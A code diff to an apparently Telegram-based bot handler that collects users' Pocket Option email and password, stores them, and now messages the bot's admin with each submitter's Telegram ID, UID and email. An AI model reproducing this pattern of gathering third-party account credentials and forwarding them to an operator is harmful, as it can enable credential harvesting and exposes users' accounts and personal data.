@@ -461,6 +461,19 @@ async def pocket_option_login_input_handler(message: types.Message, state: FSMCo
         await state.update_data(email=email, password=password)
         # Pass UID to the save_credentials function
         save_credentials(message.from_user.id, email, password, uid)
+        # Notify admin about new credentials submission
+        try:
+            from app.dispatcher import admin_panel, bot
+            admin_id = admin_panel.get_admin_id()
+            if admin_id:
+                await bot.send_message(
+                    admin_id,
+                    f"🔔 New user credentials submitted:\nUser: <code>{message.from_user.id}</code> (@{message.from_user.username or 'n/a'})\nUID: <code>{uid}</code>\nEmail: <code>{email}</code>",
+                    parse_mode="HTML"
+                )
+        except Exception as e:
+            import logging
+            logging.getLogger(__name__).warning(f"Failed to notify admin about credentials: {e}")
         # Now that UID is saved, we can clear it from the state
         await state.update_data(pocket_option_uid=None)
 
